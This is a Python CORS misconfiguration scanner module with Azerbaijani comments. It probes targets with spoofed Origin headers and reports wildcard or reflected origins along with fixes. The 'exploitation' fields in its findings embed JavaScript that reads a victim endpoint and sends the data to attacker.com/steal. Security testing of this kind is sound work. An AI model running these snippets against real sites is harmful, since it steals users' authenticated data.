"""
CORS Misconfiguration Scanner
- Wildcard origin
- Null origin bypass
- Arbitrary origin reflection
- Trusted subdomain bypass
"""

import tldextract
from rich.console import Console
from core.models import Vulnerability, Severity

console = Console()

TEST_ORIGINS = [
    "https://evil.com",
    "https://attacker.com",
    "null",
    "https://{target}",           # Target özü (credentialed check)
    "https://evil.{target}",      # Subdomain bypass cəhdi
    "https://{target}.evil.com",  # Suffix bypass
    "https://not{target}",        # Prefix bypass
]


class CORSScanner:
    def __init__(self, http_client):
        self.http_client = http_client

    def _get_domain(self, url: str) -> str:
        ext = tldextract.extract(url)
        return f"{ext.domain}.{ext.suffix}"

    async def _test_origin(self, url: str, origin: str) -> dict | None:
        """Müəyyən origin ilə CORS yoxla"""
        response = await self.http_client.get(
            url,
            headers={"Origin": origin}
        )
        if not response:
            return None

        acao = response.headers.get("access-control-allow-origin", "")
        acac = response.headers.get("access-control-allow-credentials", "")

        if not acao:
            return None

        return {
            "origin_sent": origin,
            "acao": acao,
            "acac": acac.lower() == "true",
        }

    async def scan(self, url: str) -> list[Vulnerability]:
        vulns = []
        domain = self._get_domain(url)
        console.print(f"  [dim]CORS skan: {url[:60]}[/dim]")

        # Wildcard yoxla
        response = await self.http_client.get(url)
        if response:
            acao = response.headers.get("access-control-allow-origin", "")
            acac = response.headers.get("access-control-allow-credentials", "")

            if acao == "*":
                vulns.append(Vulnerability(
                    vuln_type="CORS Misconfiguration",
                    url=url,
                    severity=Severity.MEDIUM,
                    cvss_score=5.4,
                    title="CORS Wildcard Origin",
                    description=(
                        "Access-Control-Allow-Origin: * təyin edilib. "
                        "İstənilən sayt bu endpoint-ə cross-origin request edə bilər."
                    ),
                    evidence=f"Access-Control-Allow-Origin: *",
                    exploitation=(
                        "Sensitive data endpoint-i varsa:\n"
                        "fetch('https://target.com/api/data')\n"
                        "  .then(r => r.json())\n"
                        "  .then(d => fetch('https://attacker.com/steal?d='+JSON.stringify(d)))"
                    ),
                    remediation=(
                        "Wildcard əvəzinə konkret origin siyahısı tətbiq et:\n"
                        "Access-Control-Allow-Origin: https://yourdomain.com"
                    ),
                    cwe_id="CWE-346",
                    references=["https://portswigger.net/web-security/cors"],
                ))

        # Origin reflection yoxla
        origins_to_test = [
            o.replace("{target}", domain) for o in TEST_ORIGINS
        ]

        for origin in origins_to_test:
            result = await self._test_origin(url, origin)
            if not result:
                continue

            acao = result["acao"]
            has_credentials = result["acac"]

            # Origin reflect olundu?
            if acao == origin and origin not in ["https://target.com"]:
                severity = Severity.HIGH if has_credentials else Severity.MEDIUM
                cvss = 8.1 if has_credentials else 6.5

                vuln = Vulnerability(
                    vuln_type="CORS Misconfiguration",
                    url=url,
                    severity=severity,
                    cvss_score=cvss,
                    title=f"CORS Arbitrary Origin Reflection{'+ Credentials' if has_credentials else ''}",
                    description=(
                        f"Server göndərilən Origin-i ({origin}) olduğu kimi reflect edir. "
                        f"{'Allow-Credentials: true ilə birlikdə bu kritik data theft-ə imkan verir.' if has_credentials else ''}"
                    ),
                    evidence=(
                        f"Request Origin: {origin}\n"
                        f"Response ACAO: {acao}\n"
                        f"Allow-Credentials: {result['acac']}"
                    ),
                    exploitation=(
                        f"Attacker saytından:\n\n"
                        f"var req = new XMLHttpRequest();\n"
                        f"req.open('GET', '{url}', true);\n"
                        f"{'req.withCredentials = true;' + chr(10) if has_credentials else ''}"
                        f"req.onload = function() {{\n"
                        f"  fetch('https://attacker.com/steal?d=' + encodeURIComponent(this.responseText));\n"
                        f"}};\n"
                        f"req.send();"
                    ),
                    remediation=(
                        "1. Origin whitelist yaradın — dinamik reflection etmə\n"
                        "2. Credentials istifadə edirsənsə wildcard/arbitrary origin qadağan et\n"
                        "3. Vary: Origin header əlavə et cache poisoning üçün"
                    ),
                    curl_poc=(
                        f'curl -H "Origin: {origin}" -I "{url}" | grep -i "access-control"'
                    ),
                    cwe_id="CWE-346",
                    references=["https://portswigger.net/web-security/cors"],
                )
                vulns.append(vuln)
                console.print(f"  {vuln.severity.emoji} [bold]CORS:[/bold] {origin} → reflected {'+ credentials' if has_credentials else ''}")
                break  # Bir tapanda kifayət

        return vulns
